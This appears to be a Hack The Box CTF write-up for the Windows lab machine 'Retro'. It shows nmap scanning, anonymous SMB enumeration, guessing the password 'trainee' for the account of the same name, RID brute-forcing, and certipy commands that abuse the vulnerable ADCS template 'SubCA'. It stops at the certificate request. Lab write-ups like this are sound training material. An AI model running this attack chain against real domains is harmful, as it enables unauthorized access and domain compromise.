---
layout: post
title:  "Retro"
date:   2025-06-24 17:00:00 -0400
categories: HTB-machine windows easy 
tags: HTB CTF writeup 
image:
    path: assets/img/htb/Retro/Retro.png
---

# Writeup
### Enumeration
```bash
nmap -sCV 10.129.117.252 --open                                                                                                                  

PORT     STATE SERVICE       VERSION                                                                                                                       
53/tcp   open  domain        Simple DNS Plus                                                                                                               
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-24 19:25:32Z)                                                                
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                         
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                 
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)                                   
| ssl-cert: Subject: commonName=DC.retro.vl                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl                                                                
| Not valid before: 2024-10-02T10:33:09                                                                                                                    
|_Not valid after:  2025-10-02T10:33:09                                                                                                                    
|_ssl-date: TLS randomness does not represent time                                                                                                         
445/tcp  open  microsoft-ds?                                                                                                                               
464/tcp  open  kpasswd5?                                                                                                                                   
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                           
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)                                   
| ssl-cert: Subject: commonName=DC.retro.vl                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl                                                                
| Not valid before: 2024-10-02T10:33:09                                                                                                                    
|_Not valid after:  2025-10-02T10:33:09                                                                                                                    
|_ssl-date: TLS randomness does not represent time                                                                                                         
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)                                   
| ssl-cert: Subject: commonName=DC.retro.vl                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl                                                                
| Not valid before: 2024-10-02T10:33:09                                                                                                                    
|_Not valid after:  2025-10-02T10:33:09                                                                                                                    
|_ssl-date: TLS randomness does not represent time                                                                                                         
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)                                   
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-24T19:26:11+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-04-08T01:55:44
|_Not valid after:  2025-10-08T01:55:44
|_ssl-date: 2025-06-24T19:26:50+00:00; -1s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can see port SMB is openned, so let check that.
```bash
nxc smb 10.129.117.252 -u '.' -p '' --shares                                                                                        
SMB         10.129.117.252  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)       
SMB         10.129.117.252  445    DC               [+] retro.vl\.: 
SMB         10.129.117.252  445    DC               [*] Enumerated shares
SMB         10.129.117.252  445    DC               Share           Permissions     Remark
SMB         10.129.117.252  445    DC               -----           -----------     ------
SMB         10.129.117.252  445    DC               ADMIN$                          Remote Admin
SMB         10.129.117.252  445    DC               C$                              Default share
SMB         10.129.117.252  445    DC               IPC$            READ            Remote IPC
SMB         10.129.117.252  445    DC               NETLOGON                        Logon server share 
SMB         10.129.117.252  445    DC               Notes                           
SMB         10.129.117.252  445    DC               SYSVOL                          Logon server share 
SMB         10.129.117.252  445    DC               Trainees        READ  
```

We can read content in `Trainees` share

```bash
smbclient //10.129.117.252/Trainees -N
```

Download `Important.txt` file and view its content. We can see username maybe `trainee` and password is very likely something easily remembered by a bunch of people. Try the username as the password.

### User Flag

```bash
sudo crackmapexec smb 10.129.117.252 -u trainee -p trainee --shares                                                                              
SMB         10.129.117.252  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)       
SMB         10.129.117.252  445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.117.252  445    DC               [*] Enumerated shares
SMB         10.129.117.252  445    DC               Share           Permissions     Remark
SMB         10.129.117.252  445    DC               -----           -----------     ------
SMB         10.129.117.252  445    DC               ADMIN$                          Remote Admin
SMB         10.129.117.252  445    DC               C$                              Default share
SMB         10.129.117.252  445    DC               IPC$            READ            Remote IPC
SMB         10.129.117.252  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.117.252  445    DC               Notes           READ            
SMB         10.129.117.252  445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.117.252  445    DC               Trainees        READ   
```

We can read more `Notes` share.

Download `user.txt` to get our first flag.

### Root Flag
```bash
nxc smb 10.129.117.252 -u 'trainee' -p 'trainee' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print $2}' | awk '{print $1}' > users.txt 
```

We know the name of the old machine account that has pre-windows-2000 compatibility (Brute force the RIDs of domain objects using netexec. The account name ends with $.)

```bash
certipy find -u 'trainee' -p 'trainee' -dc-ip 10.129.117.252 
```

Read this for more info: [Abusing Active Directory Certificate Services](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)

``` 
Templates vulnerable to ESC1 have the following configurations:

    Client Authentication: True
    Enabled: True
    Enrollee Supplies Subject: True
    Requires Management Approval: False
    Authorized Signatures Required: 0
```

Read through and we can notice this template `SubCA` has all the requirements.

```bash
certipy req -u 'trainee' -p trainee -dc-ip 10.129.117.252 -ca 'retro-DC-CA' -template 'SubCA' 
```

